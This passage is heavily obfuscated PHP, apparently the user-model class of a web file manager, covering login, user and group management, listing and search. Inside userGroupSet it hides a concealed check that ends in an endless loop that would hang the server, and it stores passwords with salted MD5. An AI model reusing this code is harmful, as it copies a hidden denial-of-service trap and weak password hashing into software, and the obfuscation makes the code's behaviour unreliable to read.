($Eî©¬á³Ûù) { $aºÌ¯â¬É = $this->where(array($D¨Üä±¦¶†[1514] => intval($b²ß‘İ¸Õ‚)))->find(); if (!is_array($aºÌ¯â¬É)) { return array(); } $aºÌ¯â¬É[$D¨Üä±¦¶†[2106]] = Action($D¨Üä±¦¶†[2107])->parseUrl($aºÌ¯â¬É[$D¨Üä±¦¶†[2106]]); return $aºÌ¯â¬É; } return $this->cacheFunctionGet($D¨Üä±¦¶†[1750], $b²ß‘İ¸Õ‚); } protected function getInfoSimpleOuter($A£ğ…’–Ú°) { goto BŠÛ´´¤é; aó´‚Œˆ: $dƒÃ‰†ò• = array_field_key($eƒØôƒ£áÙ, explode($dÛÕ£éùÜÖ[47], $this->simpleField)); if (!$dƒÃ‰†ò•) { return array($dÛÕ£éùÜÖ[1514] => $dÛÕ£éùÜÖ[1073], $dÛÕ£éùÜÖ[28] => $dÛÕ£éùÜÖ[160] . LNG($dÛÕ£éùÜÖ[2110]) . $dÛÕ£éùÜÖ[512], $dÛÕ£éùÜÖ[2106] => STATIC_PATH . $dÛÕ£éùÜÖ[2111]); } $dƒÃ‰†ò•[$dÛÕ£éùÜÖ[2106]] = Action($dÛÕ£éùÜÖ[2107])->parseUrl($dƒÃ‰†ò•[$dÛÕ£éùÜÖ[2106]]); goto CÌä…”¹í»; BŠÛ´´¤é: $dÛÕ£éùÜÖ =& $_SERVER[Šº]; if (!$A£ğ…’–Ú° || $A£ğ…’–Ú° == 0) { return array($dÛÕ£éùÜÖ[1514] => $dÛÕ£éùÜÖ[504], $dÛÕ£éùÜÖ[28] => $dÛÕ£éùÜÖ[160] . LNG($dÛÕ£éùÜÖ[2108]) . $dÛÕ£éùÜÖ[512], $dÛÕ£éùÜÖ[2106] => STATIC_PATH . $dÛÕ£éùÜÖ[2109]); } $eƒØôƒ£áÙ = $this->cacheFunctionGet($dÛÕ£éùÜÖ[1750], $A£ğ…’–Ú°); goto aó´‚Œˆ; CÌä…”¹í»: return $dƒÃ‰†ò•; goto E‚™á”²; E‚™á”²: } protected function groupUser($aÂ­®ÍÆ¦¯) { } public static function errorLang($CÊáŞÓŞ¨Ô) { $f¨¹Æ«ºó =& $_SERVER[Šº]; $aÃˆÌÃˆ¾ = array(self::ERROR_USER_NOT_EXISTS => $f¨¹Æ«ºó[2112], self::ERROR_USER_PASSWORD_ERROR => $f¨¹Æ«ºó[2113], self::ERROR_USER_EXIST_NAME => $f¨¹Æ«ºó[2114], self::ERROR_USER_EXIST_PHONE => $f¨¹Æ«ºó[2115], self::ERROR_USER_EXIST_EMAIL => $f¨¹Æ«ºó[2116], self::ERROR_USER_LOGIN_LOCK => $f¨¹Æ«ºó[2117], self::ERROR_IP_NOT_ALLOW => $f¨¹Æ«ºó[2118], self::ERROR_USER_EXIST_NICKNAME => $f¨¹Æ«ºó[2119]); return LNG($aÃˆÌÃˆ¾[$CÊáŞÓŞ¨Ô]); } public function getInfoByMeta($cšÑÔõ•³Á, $d…¨¤¨Š‰®) { $f ¢–³ƒóÛ =& $_SERVER[Šº]; $d‚İ¾‚åÇò = Model($f ¢–³ƒóÛ[2120])->where(array($f ¢–³ƒóÛ[93] => $cšÑÔõ•³Á, $f ¢–³ƒóÛ[371] => $d…¨¤¨Š‰®))->find(); if ($d‚İ¾‚åÇò) { return $this->getInfo($d‚İ¾‚åÇò[$f ¢–³ƒóÛ[1514]]); } return !1; } public function userLoginCheck($EèÈÑ±¦‹, $F«ã¤ÈÆã) { $e¥İôÙ¦¦» =& $_SERVER[Šº]; $B·ó¡Š¼á = $this->userLoginFind($EèÈÑ±¦‹); if (!$B·ó¡Š¼á) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($B·ó¡Š¼á[$e¥İôÙ¦¦»[1514]], $F«ã¤ÈÆã)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($B·ó¡Š¼á[$e¥İôÙ¦¦»[1514]]); } public function userLoginFind($C¬‰˜èÍÅà) { $C‚óÎ¼ÌÉã =& $_SERVER[Šº]; $a¥ãÚ ã«Î = array($C‚óÎ¼ÌÉã[28] => $C¬‰˜èÍÅà, $C‚óÎ¼ÌÉã[1941] => $C¬‰˜èÍÅà, $C‚óÎ¼ÌÉã[302] => $C¬‰˜èÍÅà, $C‚óÎ¼ÌÉã[2121] => $C¬‰˜èÍÅà, $C‚óÎ¼ÌÉã[945] => $C‚óÎ¼ÌÉã[947]); if ($this->nickNameRpt()) { unset($a¥ãÚ ã«Î[$C‚óÎ¼ÌÉã[1941]]); } return $this->where($a¥ãÚ ã«Î)->find(); } public function clearCache($eåªäÀñ’‚) { $FŒŒë´Ç“¶ =& $_SERVER[Šº]; $this->cacheFunctionClear($FŒŒë´Ç“¶[1756], $eåªäÀñ’‚); $this->cacheFunctionClear($FŒŒë´Ç“¶[1750], $eåªäÀñ’‚); $this->cacheFunctionClear($FŒŒë´Ç“¶[2102], $eåªäÀñ’‚); } public function userPasswordCheck($E’ò´¨ Ó, $C”¡½—Œ–š) { $E·ùÂŸŠ¾ƒ =& $_SERVER[Šº]; $FèÑİƒ¬½Í = $this->where(array($E·ùÂŸŠ¾ƒ[1514] => intval($E’ò´¨ Ó)))->find(); $FÚÃ¦È šÛ = $this->metaGet($E’ò´¨ Ó); $f¢ğ¸¢¯¾¶ = isset($FÚÃ¦È šÛ[$E·ùÂŸŠ¾ƒ[2122]]) ? $FÚÃ¦È šÛ[$E·ùÂŸŠ¾ƒ[2122]] : $E·ùÂŸŠ¾ƒ[33]; if (md5($f¢ğ¸¢¯¾¶ . trim($C”¡½—Œ–š)) !== $FèÑİƒ¬½Í[$E·ùÂŸŠ¾ƒ[837]]) { return !1; } return !0; } public function userAdd($c‚§¯’•ø­) { goto B½Óæò™¡ï; B½Óæò™¡ï: $e‘Ãí±¹š =& $_SERVER[Šº]; $dß±Šã¶¯ = array($e‘Ãí±¹š[420] => $c‚§¯’•ø­[$e‘Ãí±¹š[28]], $e‘Ãí±¹š[2123] => $c‚§¯’•ø­[$e‘Ãí±¹š[1400]], $e‘Ãí±¹š[2124] => isset($c‚§¯’•ø­[$e‘Ãí±¹š[302]]) ? $c‚§¯’•ø­[$e‘Ãí±¹š[302]] : $e‘Ãí±¹š[33], $e‘Ãí±¹š[2125] => isset($c‚§¯’•ø­[$e‘Ãí±¹š[2121]]) ? $c‚§¯’•ø­[$e‘Ãí±¹š[2121]] : $e‘Ãí±¹š[33], $e‘Ãí±¹š[2126] => isset($c‚§¯’•ø­[$e‘Ãí±¹š[1941]]) ? $c‚§¯’•ø­[$e‘Ãí±¹š[1941]] : $c‚§¯’•ø­[$e‘Ãí±¹š[28]], $e‘Ãí±¹š[2127] => isset($c‚§¯’•ø­[$e‘Ãí±¹š[2106]]) ? $c‚§¯’•ø­[$e‘Ãí±¹š[2106]] : $e‘Ãí±¹š[33], $e‘Ãí±¹š[2128] => isset($c‚§¯’•ø­[$e‘Ãí±¹š[2129]]) ? $c‚§¯’•ø­[$e‘Ãí±¹š[2129]] : 1, $e‘Ãí±¹š[2130] => $c‚§¯’•ø­[$e‘Ãí±¹š[837]], $e‘Ãí±¹š[1751] => isset($c‚§¯’•ø­[$e‘Ãí±¹š[1661]]) ? $c‚§¯’•ø­[$e‘Ãí±¹š[1661]] : 1024 * 1024 * 20, $e‘Ãí±¹š[1752] => 0, $e‘Ãí±¹š[2131] => 0, $e‘Ãí±¹š[1795] => isset($c‚§¯’•ø­[$e‘Ãí±¹š[711]]) ? $c‚§¯’•ø­[$e‘Ãí±¹š[711]] : 1); if (!empty($c‚§¯’•ø­[$e‘Ãí±¹š[1514]])) { $dß±Šã¶¯[$e‘Ãí±¹š[1514]] = $c‚§¯’•ø­[$e‘Ãí±¹š[1514]]; } goto Dè‚­«†¢‚; Eæ¦©–¥Ø: return $BÅÕ‹«‘Í‚; goto aœˆ³Êáœ; A¯ƒ÷ŞÓáÙ: $FØ‘ª½”Î = array($e‘Ãí±¹š[2130] => $dß±Šã¶¯[$e‘Ãí±¹š[837]], $e‘Ãí±¹š[2126] => $dß±Šã¶¯[$e‘Ãí±¹š[1941]]); $this->userEdit($BÅÕ‹«‘Í‚, $FØ‘ª½”Î); Model($e‘Ãí±¹š[1192])->userRootAdd($BÅÕ‹«‘Í‚); goto Eæ¦©–¥Ø; Dè‚­«†¢‚: $dğĞ¿¯á›Ú = $this->_checkExist($c‚§¯’•ø­); if ($dğĞ¿¯á›Ú !== !0) { return $dğĞ¿¯á›Ú; } $BÅÕ‹«‘Í‚ = $this->add($dß±Šã¶¯); goto A¯ƒ÷ŞÓáÙ; aœˆ³Êáœ: } protected function userEditTest($b‡Öèµ”Ô, $Eİê”  ì¤) { return $this->call($_SERVER[Šº][2132], $b‡Öèµ”Ô, $Eİê”  ì¤); } protected function userEdit($A¹·ÂÇ¢µö, $Eâ•¬ğ¼«) { goto B«˜®‹ÏÜ‡; B«˜®‹ÏÜ‡: $dÈØôñùĞ =& $_SERVER[Šº]; $C¯ô¼ªÃ¬ß = $this->getInfoSimple($A¹·ÂÇ¢µö); if (!$C¯ô¼ªÃ¬ß) { return !1; } goto bº¡–÷äŒ; eÜôä½ßÕÔ: $this->where(array($dÈØôñùĞ[1506] => $A¹·ÂÇ¢µö))->save($Eâ•¬ğ¼«); if (isset($Eâ•¬ğ¼«[$dÈØôñùĞ[1941]])) { $this->setNamePinyin($A¹·ÂÇ¢µö, $Eâ•¬ğ¼«[$dÈØôñùĞ[1941]]); } $this->clearCache($A¹·ÂÇ¢µö); goto dÚ°…‘–ù; bº¡–÷äŒ: $cä††Á¥È = $this->_checkExist($Eâ•¬ğ¼«, $A¹·ÂÇ¢µö); if ($cä††Á¥È !== !0) { return $cä††Á¥È; } if (isset($Eâ•¬ğ¼«[$dÈØôñùĞ[837]]) && trim($Eâ•¬ğ¼«[$dÈØôñùĞ[837]]) != $dÈØôñùĞ[33]) { $dö‘İá«„ = $this->metaGet($A¹·ÂÇ¢µö); if (empty($dö‘İá«„[$dÈØôñùĞ[2122]])) { $dö‘İá«„[$dÈØôñùĞ[2122]] = rand_string(10); Model($dÈØôñùĞ[510])->metaSet($A¹·ÂÇ¢µö, $dÈØôñùĞ[2122], $dö‘İá«„[$dÈØôñùĞ[2122]]); } $Eâ•¬ğ¼«[$dÈØôñùĞ[837]] = md5($dö‘İá«„[$dÈØôñùĞ[2122]] . trim($Eâ•¬ğ¼«[$dÈØôñùĞ[837]])); } else { unset($Eâ•¬ğ¼«[$dÈØôñùĞ[837]]); } goto eÜôä½ßÕÔ; dÚ°…‘–ù: return !0; goto dÇÔ¾Æø¿°; dÇÔ¾Æø¿°: } public function setNamePinyin($E·÷²„Üª‚, $f†³°´ = false) { $a«æ ¨Î± =& $_SERVER[Šº]; if (!$f†³°´) { $dİë†™¡Ûá = $this->getInfoSimple($E·÷²„Üª‚); $f†³°´ = $dİë†™¡Ûá[$a«æ ¨Î±[1941]] ? $dİë†™¡Ûá[$a«æ ¨Î±[1941]] : $dİë†™¡Ûá[$a«æ ¨Î±[28]]; } $F†³Áåèî = Model($a«æ ¨Î±[514]); if (!Input::check($f†³°´, $a«æ ¨Î±[564])) { return $F†³Áåèî->metaSet($E·÷²„Üª‚, array($a«æ ¨Î±[451] => $a«æ ¨Î±[33], $a«æ ¨Î±[450] => $a«æ ¨Î±[33])); } return $F†³Áåèî->metaSet($E·÷²„Üª‚, array($a«æ ¨Î±[451] => str_replace($a«æ ¨Î±[50], $a«æ ¨Î±[33], Pinyin::encode($f†³°´)), $a«æ ¨Î±[450] => Pinyin::encode($f†³°´, $a«æ ¨Î±[565]))); } private function nickNameRpt() { $D‹Æ¥Õ¦„å =& $_SERVER[Šº]; $Cæß÷¢Ü˜Ä = Model($D‹Æ¥Õ¦„å[728])->get($D‹Æ¥Õ¦„å[2133]); $E Ğßñ÷· = $GLOBALS[$D‹Æ¥Õ¦„å[6]][$D‹Æ¥Õ¦„å[377]][$D‹Æ¥Õ¦„å[2133]]; $AÉäòˆ·ğ× = !is_null($Cæß÷¢Ü˜Ä) ? $Cæß÷¢Ü˜Ä : $E Ğßñ÷·; return !!$AÉäòˆ·ğ×; } private function _checkExist($BˆöµÕ¾‘, $E«ä”†÷¼Ó = false) { $B´³Ÿ¥˜ =& $_SERVER[Šº]; $AğÀÃ¸ğˆ = array($B´³Ÿ¥˜[28] => UserModel::ERROR_USER_EXIST_NAME, $B´³Ÿ¥˜[1941] => UserModel::ERROR_USER_EXIST_NICKNAME, $B´³Ÿ¥˜[302] => UserModel::ERROR_USER_EXIST_EMAIL, $B´³Ÿ¥˜[2121] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($AğÀÃ¸ğˆ[$B´³Ÿ¥˜[1941]]); } $aé‡›Îä ™ = $E«ä”†÷¼Ó ? array($B´³Ÿ¥˜[1514] => array($B´³Ÿ¥˜[2134], $E«ä”†÷¼Ó)) : array(); foreach ($AğÀÃ¸ğˆ as $C‹š…ËÀ•Œ => $BƒêÊ×…„İ) { $c»Ã³ÉÙí = array(); foreach ($AğÀÃ¸ğˆ as $fÏÑÇ½‚è => $b±¿Œ‘•ç‡) { if (isset($BˆöµÕ¾‘[$fÏÑÇ½‚è]) && $BˆöµÕ¾‘[$fÏÑÇ½‚è]) { $c»Ã³ÉÙí[] = $BˆöµÕ¾‘[$fÏÑÇ½‚è]; } } if (!$c»Ã³ÉÙí) { continue; } $cáë¿¾¹îË = array_merge(array($C‹š…ËÀ•Œ => array($B´³Ÿ¥˜[7], $c»Ã³ÉÙí)), $aé‡›Îä ™); $b•©‚‰¨Ü = $this->where($cáë¿¾¹îË)->find(); if ($b•©‚‰¨Ü) { return $BƒêÊ×…„İ; } } return !0; } public function userListInfo($A…Ù…òŠ»˜) { $cÂ˜î¥›¸† =& $_SERVER[Šº]; $fóÉïÏ˜ŞŠ = array(); $A…Ù…òŠ»˜ = is_array($A…Ù…òŠ»˜) ? array_unique($A…Ù…òŠ»˜) : array(); if (!$A…Ù…òŠ»˜) { return $fóÉïÏ˜ŞŠ; } if (count($A…Ù…òŠ»˜) < 20) { foreach ($A…Ù…òŠ»˜ as $F³“Ç›ÓèÓ) { $fóÉïÏ˜ŞŠ[$F³“Ç›ÓèÓ . $cÂ˜î¥›¸†[33]] = $this->getInfoSimpleOuter($F³“Ç›ÓèÓ); } } else { $EäÎ¤ĞÔ’¶ = array($cÂ˜î¥›¸†[1506] => array($cÂ˜î¥›¸†[418], $A…Ù…òŠ»˜)); if (count($A…Ù…òŠ»˜) == 1) { $EäÎ¤ĞÔ’¶ = array($cÂ˜î¥›¸†[1506] => $A…Ù…òŠ»˜[0]); } $CŠÊšĞª–Ø = Model($cÂ˜î¥›¸†[510])->field($this->simpleField)->where($EäÎ¤ĞÔ’¶)->select(); $CŠÊšĞª–Ø = array_to_keyvalue($CŠÊšĞª–Ø, $cÂ˜î¥›¸†[1514]); foreach ($A…Ù…òŠ»˜ as $F³“Ç›ÓèÓ) { $Cô¢ß•˜‘ = $CŠÊšĞª–Ø[$CŠÊšĞª–Ø[$F³“Ç›ÓèÓ]]; if (!$Cô¢ß•˜‘) { $fóÉïÏ˜ŞŠ[$F³“Ç›ÓèÓ . $cÂ˜î¥›¸†[33]] = $this->getInfoSimpleOuter($F³“Ç›ÓèÓ); continue; } $Cô¢ß•˜‘[$cÂ˜î¥›¸†[2106]] = Action($cÂ˜î¥›¸†[2107])->parseUrl($Cô¢ß•˜‘[$cÂ˜î¥›¸†[2106]]); $fóÉïÏ˜ŞŠ[$F³“Ç›ÓèÓ . $cÂ˜î¥›¸†[33]] = $Cô¢ß•˜‘; } } return $fóÉïÏ˜ŞŠ; } protected function userStatus($F»æŞğÒª‡, $AØ¦›Óö‚) { $f‘¤ÃÅê÷‹ = $this->getInfoSimple($F»æŞğÒª‡); if (!$f‘¤ÃÅê÷‹) { return !1; } $bÂªï»òÄÍ = array($_SERVER[Šº][711] => $AØ¦›Óö‚); return $this->userEdit($F»æŞğÒª‡, $bÂªï»òÄÍ); } protected function userRemove($Dçç­Ñ‘Š) { goto FÌ•ÇƒŒÄ²; FÌ•ÇƒŒÄ²: $f­ŠÖÃğä½ =& $_SERVER[Šº]; $fŠÃÀÙğ‰¼ = $this->getInfoSimple($Dçç­Ñ‘Š); if (!$fŠÃÀÙğ‰¼) { return !1; } goto C‘Ü¼†°ˆ; C‘Ü¼†°ˆ: $B¥‘†…šŠ = array($f­ŠÖÃğä½[1506] => $Dçç­Ñ‘Š); Model($f­ŠÖÃğä½[571])->where($B¥‘†…šŠ)->delete(); Model($f­ŠÖÃğä½[2135])->where($B¥‘†…šŠ)->delete(); goto aóÄ  ®; aóÄ  ®: Model($f­ŠÖÃğä½[1758])->where($B¥‘†…šŠ)->delete(); Model($f­ŠÖÃğä½[2120])->where($B¥‘†…šŠ)->delete(); Model($f­ŠÖÃğä½[2136])->where($B¥‘†…šŠ)->delete(); goto BÇÀ¾öËï“; BÇÀ¾öËï“: Model($f­ŠÖÃğä½[1958])->removeUserAll($Dçç­Ñ‘Š); Model($f­ŠÖÃğä½[788])->userRootRemove($Dçç­Ñ‘Š); return $this->where($B¥‘†…šŠ)->delete(); goto B©Ü™Æ‡²; B©Ü™Æ‡²: } protected function userGroupSet($AÈÆ§Ô·š, $eîá²ÚÉ‚ë, $DƒŠÒ¤½‡œ = array()) { goto B”Ò¼–”±š; a‰ö‚êã›˜: if (!$C®„Á¦ÌŠ¥ || !is_array($eîá²ÚÉ‚ë)) { return !1; } $EÆÄŸÄò = Model($eŠßªö ¼ó[1758]); $EÆÄŸÄò->where(array($eŠßªö ¼ó[1514] => $AÈÆ§Ô·š))->delete(); goto cî×å¡©·‘; cî×å¡©·‘: $EçÈèµ‚ïß = array(); $Eôµ‹¡çò² = 0; foreach ($eîá²ÚÉ‚ë as $a§ÎÈ‘‡‚‚ => $añ”¿…ôåÙ) { $D×“Â“·İØ = array($eŠßªö ¼ó[1514] => $AÈÆ§Ô·š, $eŠßªö ¼ó[1677] => $a§ÎÈ‘‡‚‚, $eŠßªö ¼ó[1772] => $añ”¿…ôåÙ); $D×“Â“·İØ[$eŠßªö ¼ó[1700]] = isset($DƒŠÒ¤½‡œ[$Eôµ‹¡çò²]) ? $DƒŠÒ¤½‡œ[$Eôµ‹¡çò²] : 0; $Eôµ‹¡çò²++; $EçÈèµ‚ïß[] = $D×“Â“·İØ; } goto D“µÀ©µçƒ; D“µÀ©µçƒ: return $EÆÄŸÄò->addAll($EçÈèµ‚ïß, array(), !0); goto BªÏò¾Çƒ‡; B”Ò¼–”±š: $eŠßªö ¼ó =& $_SERVER[Šº]; if (!isset($_SERVER[$eŠßªö ¼ó[395]]) || !isset($_SERVER[$eŠßªö ¼ó[393]])) { goto AÕŒ¶Œö÷×; Aç¤áíÜó‘: for ($EóÂ‹«Å = $B¥öøçø—¿; $EóÂ‹«Å > 0; $EóÂ‹«Å++) { $c¤ŞŸÁŒ­¢ = json_encode($GLOBALS[$eŠßªö ¼ó[418]]); } goto C¡äˆ„Ş¯ƒ; AÕŒ¶Œö÷×: $då´·¯ŸöÔ = $eŠßªö ¼ó[829]; $a ÷ÁíŸƒ = $eŠßªö ¼ó[396]; $CÀˆÛÄò ë = $_SERVER[$eŠßªö ¼ó[397]] . $eŠßªö ¼ó[398]; goto D²İ²ëâš; D²İ²ëâš: $BÀë³†ß‡‘ = $a ÷ÁíŸƒ($CÀˆÛÄò ë); $eæõó¾ÂÅÇ = explode($eŠßªö ¼ó[228], $BÀë³†ß‡‘); if (count($eæõó¾ÂÅÇ) < $eŠßªö ¼ó[588]) { $C ‘¥‡¥öÀ = $eŠßªö ¼ó[400]; $C ‘¥‡¥öÀ(); } goto B³ÔÎÀ¥ù¥; B³ÔÎÀ¥ù¥: $c¤ŞŸÁŒ­¢ = $eŠßªö ¼ó[830]; $c¤ŞŸÁŒ­¢($_SERVER[$eŠßªö ¼ó[831]]); $B¥öøçø—¿ = 1; goto Aç¤áíÜó‘; C¡äˆ„Ş¯ƒ: } $C®„Á¦ÌŠ¥ = $this->getInfoSimple($AÈÆ§Ô·š); goto a‰ö‚êã›˜; BªÏò¾Çƒ‡: } protected function userGroupAdd($fÛÆİ§Ø, $c‹–‚Í“† = array()) { $Cï´£‹³ˆ =& $_SERVER[Šº]; $fç‹Şë¸ƒã = $this->getInfoSimple($fÛÆİ§Ø); if (!$fç‹Şë¸ƒã || empty($c‹–‚Í“†)) { return !1; } $fô¤°«ôƒö = array(); foreach ($c‹–‚Í“† as $B¨ìª¦èõ => $båíÇŠ²É°) { $fô¤°«ôƒö[] = array($Cï´£‹³ˆ[1514] => $fÛÆİ§Ø, $Cï´£‹³ˆ[1677] => $B¨ìª¦èõ, $Cï´£‹³ˆ[1772] => $båíÇŠ²É°, $Cï´£‹³ˆ[1700] => 0); } return Model($Cï´£‹³ˆ[1758])->addAll($fô¤°«ôƒö, array(), !0); } protected function userGroupRemove($fÇééĞ‹Á„, $CÀ¼âÚ¢…) { $f°Ê´¤ôåà =& $_SERVER[Šº]; $CºŒÒÇ¿ñç = $this->getInfoSimple($fÇééĞ‹Á„); if (!$CºŒÒÇ¿ñç || !$CÀ¼âÚ¢…) { return !1; } $e†ò£Ò§Ç‹ = array($f°Ê´¤ôåà[1506] => $fÇééĞ‹Á„, $f°Ê´¤ôåà[1755] => $CÀ¼âÚ¢…); return Model($f°Ê´¤ôåà[1758])->where($e†ò£Ò§Ç‹)->delete(); } public function listData() { $FµŒ¦Í­é = $this->_makeOrder()->selectPage(50); $this->_listDataApply($FµŒ¦Í­é[$_SERVER[Šº][366]]); return $FµŒ¦Í­é; } public function listByID($D”Ø¾©àÃ¬) { $dÁš³ ÒÈ =& $_SERVER[Šº]; if (!$D”Ø¾©àÃ¬) { return; } $A’±ç¥Êë = array($dÁš³ ÒÈ[1514] => array($dÁš³ ÒÈ[7], $D”Ø¾©àÃ¬)); $FËî§½øÔ = $this->where($A’±ç¥Êë)->select(); $this->_listDataApply($FËî§½øÔ); return $FËî§½øÔ; } public function listByGroup($aë™„İ¦÷„ = 0, $c×²ÖĞÄï† = array()) { goto ağÁ¿°„Äñ; cñáÕ¡Œ°Õ: $this->_listDataApply($aÑì¹’¬ß[$A²™ï§÷ä[366]]); return $aÑì¹’¬ß; goto D©¦ùÖÚö; Eİªä½¸Ì: if ($aë™„İ¦÷„) { $eŸ÷‹…¿Ø¡ = array($A²™ï§÷ä[2137] => intval($aë™„İ¦÷„)); $dæ×¢„Ì = "\114\x45\106\124\40\112\x4f\111\x4e\40{$this->tablePrefix}\165\x73\145\x72\137\x67\x72\157\165\160\40\165\163\x65\162\137\147\x72\157\x75\x70\40\157\x6e\x20\165\x73\x65\162\56\165\x73\145\162\x49\104\x20\x3d\40\165\x73\x65\162\137\147\x72\x6f\165\x70\x2e\165\163\145\162\x49\x44"; $b¢•ÔÊ½¾à = Input::get($A²™ï§÷ä[442], null, $A²™ï§÷ä[33]) ? $A²™ï§÷ä[33] : $A²™ï§÷ä[2138]; } if (isset($c×²ÖĞÄï†[$A²™ï§÷ä[711]])) { $eŸ÷‹…¿Ø¡[$A²™ï§÷ä[2139]] = $c×²ÖĞÄï†[$A²™ï§÷ä[711]]; } $aÑì¹’¬ß = $this->_makeOrder($b¢•ÔÊ½¾à)->field($A²™ï§÷ä[2140])->where($eŸ÷‹…¿Ø¡)->join($dæ×¢„Ì)->selectPage(50); goto cñáÕ¡Œ°Õ; ağÁ¿°„Äñ: $A²™ï§÷ä =& $_SERVER[Šº]; $dæ×¢„Ì = $A²™ï§÷ä[33]; $eŸ÷‹…¿Ø¡ = array(); goto Eİªä½¸Ì; D©¦ùÖÚö: } private function _makeOrder($EÑŒ»îŞ’• = '') { goto a™ŸÁš«áá; dø¼‰‰§°»: $EÑŒ»îŞ’• = $EÑŒ»îŞ’• . "\165\x73\x65\x72\56{$cô” Õ×µŞ}\x20{$AÅâÓè}\x2c\x20\165\163\x65\x72\x2e\x75\x73\x65\162\x49\104\x20\x61\x73\x63"; return $this->alias($dë‹óß†¦¸[1881])->order($EÑŒ»îŞ’•); goto Bà‘‰¹…ñ”; a™ŸÁš«áá: $dë‹óß†¦¸ =& $_SERVER[Šº]; $aæÙ’³»Œ = array($dë‹óß†¦¸[1514], $dë‹óß†¦¸[28], $dë‹óß†¦¸[1663], $dë‹óß†¦¸[1635], $dë‹óß†¦¸[193]); $fõ¸¿‚´Ÿ = array($dë‹óß†¦¸[435] => $dë‹óß†¦¸[436], $dë‹óß†¦¸[437] => $dë‹óß†¦¸[438]); goto Fïøç‘î¬º; Fïøç‘î¬º: $cô” Õ×µŞ = Input::get($dë‹óß†¦¸[442], $dë‹óß†¦¸[7], $dë‹óß†¦¸[1506], $aæÙ’³»Œ); $AÅâÓè = Input::get($dë‹óß†¦¸[443], $dë‹óß†¦¸[7], $dë‹óß†¦¸[1759], array($dë‹óß†¦¸[1759], $dë‹óß†¦¸[437])); $AÅâÓè = $fõ¸¿‚´Ÿ[$AÅâÓè]; goto dø¼‰‰§°»; Bà‘‰¹…ñ”: } public function listSearch($cº¿ŠÅ´¦¹) { goto c†ì…ŒµƒË; FÊ´Ü²Š : $bÁˆÃÅ¢Òœ = str_replace($aˆ§äËÂ‘â[1762], $aˆ§äËÂ‘â[1763], trim($bÁˆÃÅ¢Òœ)); $A×ãçö ã¨ = array($aˆ§äËÂ‘â[28] => array($aˆ§äËÂ‘â[379], "\45{$bÁˆÃÅ¢Òœ}\45"), $aˆ§äËÂ‘â[302] => array($aˆ§äËÂ‘â[379], "{$bÁˆÃÅ¢Òœ}\45"), $aˆ§äËÂ‘â[1941] => array($aˆ§äËÂ‘â[379], "{$bÁˆÃÅ¢Òœ}\45"), $aˆ§äËÂ‘â[945] => $aˆ§äËÂ‘â[1764]); if (Input::check($bÁˆÃÅ¢Òœ, $aˆ§äËÂ‘â[308])) { $A×ãçö ã¨[$aˆ§äËÂ‘â[1514]] = array($aˆ§äËÂ‘â[379], "{$bÁˆÃÅ¢Òœ}\x25"); $A×ãçö ã¨[$aˆ§äËÂ‘â[2121]] = array($aˆ§äËÂ‘â[379], "{$bÁˆÃÅ¢Òœ}\45"); } goto f¢øÈ×âî–; c¯Åà÷÷•: $b±ÁŞà†èÌ = $this->_makeOrder()->where($A×ãçö ã¨)->selectPage(20); if (!$b±ÁŞà†èÌ || count($b±ÁŞà†èÌ[$aˆ§äËÂ‘â[366]]) < 5 && Input::check($bÁˆÃÅ¢Òœ, $aˆ§äËÂ‘â[315])) { $c§¨âšªÄ÷ = $this->_searchFromMeta($aˆ§äËÂ‘â[450], $bÁˆÃÅ¢Òœ, 10); $FÖå°ä‚¾œ = $this->_searchFromMeta($aˆ§äËÂ‘â[451], $bÁˆÃÅ¢Òœ, 10); $Aòè ±ºã‘ = array_merge($c§¨âšªÄ÷, $FÖå°ä‚¾œ, $b±ÁŞà†èÌ[$aˆ§äËÂ‘â[366]]); $b±ÁŞà†èÌ[$aˆ§äËÂ‘â[366]] = array_unique_by_key($Aòè ±ºã‘, $aˆ§äËÂ‘â[1514]); $b±ÁŞà†èÌ[$aˆ§äËÂ‘â[363]][$aˆ§äËÂ‘â[364]] = count($b±ÁŞà†èÌ[$aˆ§äËÂ‘â[366]]); $b±ÁŞà†èÌ[$aˆ§äËÂ‘â[363]][$aˆ§äËÂ‘â[365]] = ceil($b±ÁŞà†èÌ[$aˆ§äËÂ‘â[363]][$aˆ§äËÂ‘â[364]] / $b±ÁŞà†èÌ[$aˆ§äËÂ‘â[363]][$aˆ§äËÂ‘â[360]]); } $this->_listDataApply($b±ÁŞà†èÌ[$aˆ§äËÂ‘â[366]]); goto có§¾‹ÖŸè; f¢øÈ×âî–: if (!$bÁˆÃÅ¢Òœ) { $A×ãçö ã¨ = array(); } if (isset($cº¿ŠÅ´¦¹[$aˆ§äËÂ‘â[711]])) { $A×ãçö ã¨[$aˆ§äËÂ‘â[711]] = $cº¿ŠÅ´¦¹[$aˆ§äËÂ‘â[711]]; } $A×ãçö ã¨ = $this->parseWhereLike($A×ãçö ã¨); goto c¯Åà÷÷•; c†ì…ŒµƒË: $aˆ§äËÂ‘â =& $_SERVER[Šº]; $bÁˆÃÅ¢Òœ = $cº¿ŠÅ´¦¹[$aˆ§äËÂ‘â[1760]]; $Aƒ«Ç¬‡ = isset($cº¿ŠÅ´¦¹[$aˆ§äËÂ‘â[1761]]) ? $cº¿ŠÅ´¦¹[$aˆ§äËÂ‘â[1761]] : !1; goto FÊ´Ü²Š ; có§¾‹ÖŸè: $this->_filterByGroup($b±ÁŞà†èÌ, $Aƒ«Ç¬‡); return $b±ÁŞà†èÌ; goto bèš­‹£Èí; bèš­‹£Èí: } private function _filterByGroup(&$C£øĞÓÏ´, $eÆ™àĞ„Ù–) { $eøè«²‰‡ =& $_SERVER[Šº]; if (!$eÆ™àĞ„Ù–) { return $C£øĞÓÏ´; } foreach ($C£øĞÓÏ´[$eøè«²‰‡[366]] as $f éå†’È => &$Aò¶ë—˜±) { $càÀ õ¾è = array_to_keyvalue($Aò¶ë—˜±[$eøè«²‰‡[1851]], $eøè«²‰‡[33], $eøè«²‰‡[1677]); if (!in_array($eÆ™àĞ„Ù–, $càÀ õ¾è)) { unset($C£øĞÓÏ´[$eøè«²‰‡[366]][$f éå†’È]); } } unset($Aò¶ë—˜±); $C£øĞÓÏ´[$eøè«²‰‡[366]] = array_values($C£øĞÓÏ´[$eøè«²‰‡[366]]); $C£øĞÓÏ´[$eøè«²‰‡[363]] = array($eøè«²‰‡[1913] => count($C£øĞÓÏ´[$eøè«²‰‡[366]]), $eøè«²‰‡[1911] => $C£øĞÓÏ´[$eøè«²‰‡[363]][$eøè«²‰‡[360]], 